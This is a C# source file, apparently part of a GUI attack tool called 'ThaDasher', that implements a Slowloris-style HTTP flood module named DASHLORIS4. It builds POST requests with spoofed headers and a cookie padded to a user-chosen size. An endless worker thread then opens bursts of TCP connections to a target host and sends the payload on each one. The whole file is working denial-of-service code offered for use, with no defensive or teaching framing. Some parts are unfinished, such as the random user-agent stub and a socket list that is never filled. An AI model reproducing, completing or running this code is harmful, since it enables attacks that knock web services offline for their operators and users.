
//
// Author: Dashie
// Version: 1.0
//

using System;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

namespace ThaDasher
{
    public class DASHLORIS4
    {
	/*cd=Connection Delay; clt=Connection Live Time; ccc=Cycle Connection Count; rua=Random User-Agent*/
	//
	// Method: GET, POST, PUT
	// HTTP Version: (HTTP/) 1.0, 1.1, 1.2                                
	// Host: <url>
	// Cache-Type: no-store, no-cache, none
	// Connection-Type: keep-alive, close
	// Pragma: no-cache
	// Upgrade-Insecure-Requests: 1, 0
	// User-Agent: <any>
	// Cookie: <any>
	// Accept: text/html, text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	// Accept-Encoding: gzip, deflate
	// Origin: <url>
	// Accept-Language: tr-TR,tr
	// Connection: Close, Open
	// Content-Length: <any>
	private static string header_template = (
	    /*HEAD*/ "POST / HTTP/1.1\r\n" +
	    "Host: %host%\r\n" +
	    "Connection: Close\r\n" +
	    "Connection-Type: Close\r\n" +
	    //"Pragma: no-cache\r\n" +
	    "Upgrade-Insecure-Requests: 1\r\n" +
	    "User-Agent: %useragent%\r\n" +
	    "Accept: text/html\r\n" +
	    "Accept-Encoding: gzip,deflate\r\n" +//,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" +
	    //"Content-Length: %length%\r\n" +
	    "Origin: https://www.google.co.uk\r\n" +
	    "Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.6,en;q=0.4\r\n" +
	    "Cookie: DashTypeCookie=%data%\r\n\r\n"
	);

	private static string GetUserAgent()
	{
	    string useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36";

	    if (HTTP.DASHLORIS4.RANDOM_USER_AGENT.Text.ToLower() == "true")
	    {
		// Get random user-agent from file. // Put into DashNet.cs
	    }

	    return useragent;
	}

	private static string data = string.Empty;

	private static void Send(Socket long_high)
	{   
	    var host = DashNet.host;
	    var port = DashNet.port;

	    var hed = header_template.Replace("%host%", host).Replace("%data%", data);
	    
	    var result = long_high.BeginConnect(host, port, null, null);
	    var succes = result.AsyncWaitHandle.WaitOne(500, true);

	    if (long_high.Connected)
	    {
		long_high.Send(System.Text.Encoding.ASCII.GetBytes(hed.Replace("%useragent%", GetUserAgent())));
	    }

	    long_high.Close();
	}

	private static void SendIt(string data) =>
	    LogContainer.LOG.AppendText($"{data}\r\n");

	public static void Launch()//(int cd, int clt, int ccc, bool rua)
	{
	    try
	    {
		SendIt("Generating Data Bytes ....");

		data = "a"; for (int k = 0; k < int.Parse(HTTP.DASHLORIS4.BYTES.Text); k += 1) data += "a";

		SendIt("Done!  Sending it!!!");

		Socket GetSocket() =>
		    new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

		var cbd = int.Parse(HTTP.DASHLORIS4.CONNECTION_BURST_DELAY.Text);
		var clt = int.Parse(HTTP.DASHLORIS4.CONNECTION_LIVE_TIME.Text);
		var ccc = int.Parse(HTTP.DASHLORIS4.CYCLE_CONNECTION_COUNT.Text);

		DashNet.workers.Add(new Thread(() =>
		{
		    while (true)
		    {
			var long_highs = new List<Socket>();

			for (int k = 0; k < 4; k += 1)
			{
			    for (int s = 0; s < ccc / 4; s += 1)
			    {
				Send(GetSocket());
			    }

			    Thread.Sleep(clt);
			}

			Thread.Sleep(clt);

			foreach (var long_high in long_highs)
			{
			    long_high.Disconnect(false);
			    long_high.Dispose();

			    long_highs.Clear();
			}
		    }
		}));
	    }

	    catch (Exception e)
	    {
		MessageBox.Show($"{e.StackTrace}");
	    }
	}
    }
}
